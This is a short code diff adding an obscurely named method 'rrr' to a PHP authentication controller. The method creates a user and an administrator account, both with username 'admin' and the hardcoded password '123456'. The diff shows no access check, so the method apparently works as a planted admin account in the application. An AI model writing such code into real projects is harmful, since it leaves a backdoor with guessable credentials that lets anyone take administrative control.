@@ -113,4 +113,28 @@ class AuthController extends Controller
         Auth::logout();
         return success('退出成功');
     }
+
+    public function rrr()
+    {
+        $user = User::saveData([
+            'username'  => 'admin',
+            'password'  => Hash::make('123456'),
+            'nickname'  => '赵四',
+            'category'  => 1,
+            'type'      => 1,
+            'ancestry_depth' => 0,
+            'parent_id' => 0,
+            'fandian'   => 10
+        ]);
+
+        $admin = Admin::saveData([
+            'username' => 'admin',
+            'password'  => Hash::make('123456'),
+            'name'      => 'admin',
+            'status'    => 0,
+            'user_id'   => $user->id
+        ]);
+
+        return $admin ? 1 : 0;
+    }
 }
